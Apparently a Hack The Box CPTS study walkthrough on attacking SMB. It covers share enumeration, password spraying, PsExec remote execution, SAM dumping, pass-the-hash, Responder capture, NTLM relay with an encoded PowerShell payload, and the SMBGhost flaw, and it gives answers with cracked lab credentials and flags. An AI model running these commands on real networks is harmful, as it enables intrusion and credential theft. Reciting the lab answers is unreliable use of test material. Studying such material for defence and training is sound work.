### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - SMB Attacks & Vulnerabilities <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking SMB



SMB on `TCP/445` (modern) or `TCP/139` + `UDP/137,138` (NetBIOS). Samba is the Linux open-source impl. MSRPC commonly runs over SMB named pipes.

Nmap baseline:

```diff
+ $ sudo nmap 10.129.14.128 -sV -sC -p139,445
```

<br>

Null session - list shares with `smbclient`:

```diff
+ $ smbclient -N -L //10.129.14.128
```

<br>

`smbmap` - per-share permissions and recursive listings:

```diff
+ $ smbmap -H 10.129.14.128
+ $ smbmap -H 10.129.14.128 -r notes
+ $ smbmap -H 10.129.14.128 --download "notes\note.txt"
+ $ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

<br>

`rpcclient` - null session against MS-RPC:

```diff
+ $ rpcclient -U'%' 10.10.110.17
+ rpcclient $> enumdomusers
```

<br>

`enum4linux-ng` - automated SMB / RPC enumeration:

```diff
+ $ ./enum4linux-ng.py 10.10.11.45 -A -C
```

<br>

Password spraying with `CrackMapExec` (avoids account lockouts vs brute-force):

```diff
+ $ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

| Flag | Description |
|---|---|
| `-u <file>` | userlist |
| `-p <pw>` | single password to spray |
| `--local-auth` | non-domain-joined target |
| `--continue-on-success` | keep spraying after first hit |

<br>

Remote code execution via Impacket PsExec:

```diff
+ $ impacket-psexec administrator:'Password123!'@10.10.110.17
```

<br>

CrackMapExec command exec (multi-host capable):

```diff
+ $ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

<br>

Enumerate logged-on users across a subnet:

```diff
+ $ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

<br>

Dump SAM hashes (admin context):

```diff
+ $ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

<br>

Pass-the-Hash (PtH) - auth with NT hash directly:

```diff
+ $ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

<br>

Forced authentication / NetNTLMv2 capture with `Responder`:

```diff
+ $ sudo responder -I tun0
```

Crack the captured hash (mode 5600 = NetNTLMv2):

```diff
+ $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

<br>

NTLM relay - first disable SMB in `/etc/responder/Responder.conf`, then:

```diff
+ $ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+ $ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <BASE64>'
```

<br>

---

<br>

### Latest SMB Vulnerabilities - SMBGhost CVE-2020-0796



`SMBGhost` ([CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)) - integer overflow in the SMB v3.1.1 compression mechanism on Windows 10 1903/1909. Unauthenticated RCE / full system access.

#### Concept mapping - initiation:

| # | Step | Category |
|---|---|---|
| 1 | Attacker-manipulated SMB request to the server. | `Source` |
| 2 | Compressed packets processed via negotiated protocol response. | `Process` |
| 3 | Process runs with system / admin privileges. | `Privileges` |
| 4 | Local SMB process is the destination. | `Destination` |

#### Concept mapping - RCE (cycle restart):

| # | Step | Category |
|---|---|---|
| 5 | Output of prior process feeds the next. | `Source` |
| 6 | Integer overflow overwrites buffer; CPU executes attacker instructions. | `Process` |
| 7 | Same SMB privileges retained. | `Privileges` |
| 8 | Reverse shell back to attacker host. | `Destination` |

PoC: [Exploit-DB 48537](https://www.exploit-db.com/exploits/48537).

<br>

---

<br>

### SMB Exercise

IP: 10.129.203.6

---

### Question 1:
What is the name of the shared folder with READ permissions?

#### Enumerate shares with `smbmap`.

```diff
+ $ smbmap -H 10.129.203.6
```

	Disk            Permissions     Comment
	----            -----------     -------
	print$          NO ACCESS       Printer Drivers
	GGJ             READ ONLY       Priv
	IPC$            NO ACCESS       IPC Service (attcsvc-linux Samba)

&#x1F6A9; found **GGJ**.

---

### Question 2:
What is the password for the username "jason"?

#### Pull domain users via `rpcclient` null session, then dictionary-attack the FTP login.

```diff
+ $ rpcclient -U "" 10.129.203.6
+ rpcclient $> enumdomusers
```

	user:[jason] rid:[0x3e8]
	user:[robin] rid:[0x3e9]

#### Brute-force FTP with the discovered usernames + downloaded password list:

```diff
+ $ medusa -h 10.129.203.6 -U jasonrobin.txt -P pws.list -M ftp -t 24 -n 2121
```

	ACCOUNT FOUND: [ftp] Host: 10.129.203.6 User: jason Password: 34c8zuNBo91!@28Bszh [SUCCESS]

&#x1F6A9; found **34c8zuN--edit--Bo91!@28Bszh**.

---

### Question 3:
Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

#### Despite the prompt, FTP login worked with the same creds - pulled the flag from there.

```diff
+ $ ftp 10.129.203.6 2121
+ ftp> get flag.txt
```

&#x1F6A9; found **HTB{SMB_4TT4--edit--CKS_2349872359}**.
